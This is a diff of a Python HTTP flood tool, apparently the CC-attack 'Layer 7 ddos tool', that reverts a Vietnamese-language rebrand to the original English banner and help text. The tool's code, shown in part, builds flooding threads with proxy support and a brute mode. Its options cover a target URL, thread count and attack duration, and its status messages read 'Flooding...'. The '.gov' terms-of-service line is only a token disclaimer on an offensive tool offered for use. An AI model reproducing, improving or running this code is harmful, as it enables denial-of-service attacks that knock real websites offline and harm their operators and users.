@@ -18,21 +18,25 @@ import os
 
 
 print ('''
- _      ______ _____ _    _  ____  _   _  _____ _______   _      _             _____  _____              _   _             _    
-| |    |  ____/ ____| |  | |/ __ \| \ | |/ ____|__   __| (_)    | |           |  __ \|  __ \            | | | |           | |   
-| |    | |__ | |    | |  | | |  | |  \| | |  __   | |_ __ _  ___| | _____ _ __| |  | | |  | |______ __ _| |_| |_ __ _  ___| | __
-| |    |  __|| |    | |  | | |  | | . ` | | |_ |  | | '__| |/ __| |/ / _ \ '__| |  | | |  | |______/ _` | __| __/ _` |/ __| |/ /
-| |____| |___| |____| |__| | |__| | |\  | |__| |  | | |  | | (__|   <  __/ |  | |__| | |__| |     | (_| | |_| || (_| | (__|   < 
-|______|______\_____|\____/ \____/|_| \_|\_____|  |_|_|  |_|\___|_|\_\___|_|  |_____/|_____/       \__,_|\__|\__\__,_|\___|_|\_\
-
-Tool by Le Cuong Piano 
+	   /////    /////    /////////////
+	  CCCCC/   CCCCC/   | CC-attack |/
+	 CC/      CC/       |-----------|/ 
+	 CC/      CC/       |  Layer 7  |/ 
+	 CC/////  CC/////   | ddos tool |/ 
+	  CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
 Version 3.7.1 (2022/3/24)
                               C0d3d by L330n123
-│││││││││││││││││││││││││││││││││││││││││││││││││
-KHÔNG ĐƯỢC PHÉP DDOS WEBSITE CO TÊN MIỀN LÀ .gov
-Ví dụ; https://bluezone.gov.vn/
-
+┌─────────────────────────────────────────────┐
+│        Tos: Don't attack .gov website       │
+├─────────────────────────────────────────────┤
+│                 New stuff:                  │
+│          [+] Added Http Proxy Support       │
+│          [+] Optimization                   │
+│          [+] Changed Varible Name           │
+├─────────────────────────────────────────────┤
+│ Link: https://github.com/Leeon123/CC-attack │
+└─────────────────────────────────────────────┘''')
 
 acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -79,7 +83,7 @@ referers = [
 ]
 
 ######### Default value ########
-mode = "dd"
+mode = "cc"
 url = ""
 proxy_ver = "5"
 brute = False
@@ -101,7 +105,7 @@ def build_threads(mode,thread_num,event,proxy_type):
 			th.start()
 	elif mode == "cc":
 		for _ in range(thread_num):
-			th = threading.Thread(target = dd,args=(event,proxy_type,))
+			th = threading.Thread(target = cc,args=(event,proxy_type,))
 			th.daemon = True
 			th.start()
 	elif mode == "head":
@@ -571,21 +575,21 @@ def DownloadProxies(proxy_ver):
 	print("> Have already downloaded proxies list as "+out_file)
 
 def PrintHelp():
-	print('''===============  DD-attack help list all  ===============
-   -h/giúp đỡ   | hiển thị tin nhắn này
-   -url         | đặt url mục tiêu
-   -m/cách thức | đặt chế độ chương trình
-   -data        | đặt đường dẫn dữ liệu bài đăng (chỉ hoạt động ở chế độ bài đăng)
-                | (Ví dụ: -data data.json)
-   -cookies     | đặt cookie (Ví dụ: 'id: xxx; ua: xxx')
-   -v           | đặt loại proxy (4/5 / http, mặc định: 5)
-   -t           | đặt số chủ đề (mặc định: 800)
-   -f           | đặt tệp proxy (mặc định: proxy.txt)
-   -b           | bật / tắt chế độ vũ phu
-                | Bật = 1 Tắt = 0 (mặc định: 0)
-   -s           | đặt thời gian tấn công (mặc định: 60)
-   -down        | tải xuống proxy
-   -check       | kiểm tra proxy
+	print('''===============  CC-attack help list  ===============
+   -h/help   | showing this message
+   -url      | set target url
+   -m/mode   | set program mode
+   -data     | set post data path (only works on post mode)
+             | (Example: -data data.json)
+   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
+   -v        | set proxy type (4/5/http, default:5)
+   -t        | set threads number (default:800)
+   -f        | set proxies file (default:proxy.txt)
+   -b        | enable/disable brute mode
+             | Enable=1 Disable=0  (default:0)
+   -s        | set attack time(default:60)
+   -down     | download proxies
+   -check    | check proxies
 =====================================================''')
 
 
@@ -691,21 +695,12 @@ def main():
 		th.start()
 	else:'''
 	event = threading.Event()
-	print("> Lê Cường đang kiến ​​tạo​​đang xây dựng....")
+	print("> Building threads...")
 	build_threads(mode,thread_num,event,proxy_type)
 	event.clear()
 	#input("Press Enter to continue.")
 	event.set()
-	print("> Attacking the flood....
-	                ____________      _____ 
-                  |  _  \  _  \    /  ___|
-  __ _ _ __   __ _| | | | | | |___ \ `--. 
- / _` | '_ \ / _` | | | | | | / _ \ `--. \
-| (_| | | | | (_| | |/ /| |/ / (_) /\__/ /
- \__,_|_| |_|\__, |___/ |___/ \___/\____/ 
-              __/ |                       
-             |___/                        
-")
+	print("> Flooding...")
 	time.sleep(period)
 
 if __name__ == "__main__":
